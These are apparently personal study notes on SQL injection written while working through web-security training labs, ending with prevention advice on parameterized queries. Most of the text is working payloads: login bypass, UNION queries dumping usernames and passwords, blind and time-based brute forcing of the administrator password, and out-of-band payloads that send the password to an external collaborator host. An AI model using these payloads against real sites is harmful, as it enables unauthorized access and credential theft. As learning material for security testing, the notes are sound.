# WHAT is SQL Injection
- Vulnerability that allows an attacker to interfere with the queries that an application makes to its database
- Get,modify,delete Data, and sometimes DoS

# Detect SQL Vulnerabilitty
- The single quote character **'** and look for errors or other anomalies.
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.

- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause.

### **LAB 1** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data 
- Normal `/filter?category=Gifts`
- Modified `/filter?category=Gifts'+OR+1=1--`
- Payload `'OR=+1=1--`
- Original query `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

### **LAB 2  SQL injection vulnerability allowing login bypass**
- Original Query `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
- Payload `administrator'--` , comment password check

# UNION Attacks
- The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query
- `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- For a UNION query to work, two key requirements must be met:
      - _**The individual queries must return the same number of columns.**_
      - _**The data types in each column must be compatible between the individual queries.**_

## Determining the number of columns required 
- One method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs.
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
... Until Error, sometimes there are not any response to front-end
```

- The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
### **LAB 3 SQL injection UNION attack, determining the number of columns returned by the query**
- Original Query : `/filter?category=Pets`
- Payload : `/filter?category=Pets'UNION+SELECT+NULL,NULL,NULL--` add NULL until get an error, we get error 4 NULL, this mean there are 3 value

## Finding columns with a useful data type

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
### LAB 
- Original Query: `/filter?category=Pets`
- Payload `/filter?category=Pets'UNION+SELECT+NULL,'a',NULL--` , find size then replace string with another null


## Using a SQL injection UNION attack to retrieve interesting data
- You should know column and table names, or you should guess. EX:
- `' UNION SELECT username, password FROM users--`
### LAB
- Original : `/filter?category=Lifestyle`
- Payload : `/filter?category=Lifestyle'UNION+SELECT+username,password+FROM+users-`

## Retrieving multiple values within a single column
- You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
- `' UNION SELECT username || '~' || password FROM users--`
- This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.

### LAB 
- Original query : `/filter?category=Lifestyle`
- Indentify which column contain string : `'+UNION+SELECT+NULL,'abc'--`
- Payload:  `filter?category=Lifestyle'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`

# Examining the database in SQL injection attacks
- Necessary information
            - The type and version of the database software.
            - The tables and columns that the database contains.

- _**Querying the database type and version look at cheat sheet at the end**_ 

## Listing the contents of the database
- Get TABLE names `SELECT * FROM information_schema.tables`
- Get COLUMN names `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
- If dont work , replace * with NULLS and find spaces(columns size)


# Blind SQL injection
- Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
## Exploiting blind SQL injection by triggering conditional responses _**LAB**_

- Orginal query: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
- We detecd that SQLi vuln and  output is different in TRUE and FALSE situation
      - `…xyz' AND '1'='1` TRUE -> We get 'Welcome Back' string in page
      - `…xyz' AND '1'='2` FALSE -> Nothing changed
- Verify that users table exist `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'`
- Verify Administrator user is exist `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
- Identify password lenght `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
- Brute Forcing password `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

# Error-Based SQLi
- To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
- These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true:
            - With the first input, the CASE expression evaluates to 'a', which does not cause any error.
            - With the second input, it evaluates to 1/0, which causes a divide-by-zero error.
- Retrive one character a time
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

# Extracting sensitive data via verbose SQL error messages
- Sometimes when we add `'` there are error message. And it show us entire query parameter. EX:
- `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
- This effectively turns an otherwise blind SQL injection vulnerability into a visible one. Blind -> Visible One. _**You can use the CAST() function to achieve this. It enables you to convert one data type to another.**_
-`CAST((SELECT example_column FROM example_table) AS int)`
- _**LAB**_: We get error that AND must be boolen statement, and it is return more row than a one that is why we LIMIT to 1 `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

# Exploiting blind SQL injection by triggering time delays
- Using this technique, we can retrieve data by testing one character at a time:
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
##### LAB TIME DELAYS
- Identify its Vulnerable: `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
- And vise versa to not delay `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
- Identify that there are administrator user exist `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
- Find password lengt via incresing number `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>$^1^$)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
- Brute Force to Password chars one by one (you can also increase password's x'nd character one by ona manually without PITCHFORK attack) : `TrackingId=x';SELECT CASE WHEN (username='administrator' and substring(password,§1§,1)='§a§') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--`

# Exploiting blind SQL injection using out-of-band (OAST) techniques
- OAST testing is Out of band Application Security Testing where we send a payload to the server that causes an interaction with an external system we have control over, that sits outside the target domain.
### _**LAB1**_ Occur DNS lookup to our BCollaborater server: 
- `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
- Lab 1  in other SQL server :`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--` 
### _**LAB2**_ DNS lookup, 
- But we declare `p` as a password from users table , and use lookup url like `p+.b_collaborator_url'
- `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`


# Lab: SQL injection with filter bypass via XML encoding
- XML
```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
- **Encode our payload :**-> Extensions > Hackvertor > Encode > dec_entities/hex_entities.

# Second-order SQL injection
- Second-order SQL injection is a more advanced form of SQL injection. It occurs when an attacker injects malicious code into a web application that is stored in a database and later executed by the application. The key difference is that the code is not executed immediately, but rather at a later time

# How to prevent SQL injection
- You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as "prepared statements".
- The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:
```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```
- You can rewrite this code in a way that prevents the user input from interfering with the query structure:
```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
## SQL Cheat Sheet https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://portswigger.net/web-security/sql-injection/cheat-sheet
